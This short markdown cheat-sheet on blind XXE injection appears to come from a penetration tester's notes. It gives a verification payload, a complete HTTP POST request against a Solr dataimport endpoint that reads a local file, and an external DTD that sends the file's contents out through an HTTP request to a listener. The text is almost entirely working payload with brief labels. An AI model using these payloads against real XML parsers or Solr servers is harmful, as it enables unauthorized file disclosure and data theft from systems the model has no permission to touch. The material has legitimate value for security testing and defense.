### XXE injection

#### Blind XXE injection
1. just for verifying XXE.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd">
%remote;]>
<root/>
```

2. extract file content from target system
```http
POST /solr/new_core/dataimport HTTP/1.1
Host: cqq.com:8983
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 255

command=full-import&dataConfig=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE any[
<!ENTITY %25 file SYSTEM "file:///Users/Shared/cccc">
<!ENTITY %25 remote SYSTEM "http://127.0.0.1:8000/xxe.dtd">
%25remote%3b
%25all%3b
]>
<root>%26send%3b</root>
```
The original xml content is as follows:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE any[
<!ENTITY % file SYSTEM "file:///Users/Shared/cccc">
<!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd">
%remote;
%all;
]>
<root>&send;</root>
```
while the content of `/Users/Shared/cccc` is: `shadowsock5`.
while the content of `http://127.0.0.1:8000/xxe.dtd` is:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8888/?content=%file;'>">
```


#### Ref
http://ceye.io/payloads
https://blog.csdn.net/u011721501/article/details/43775691
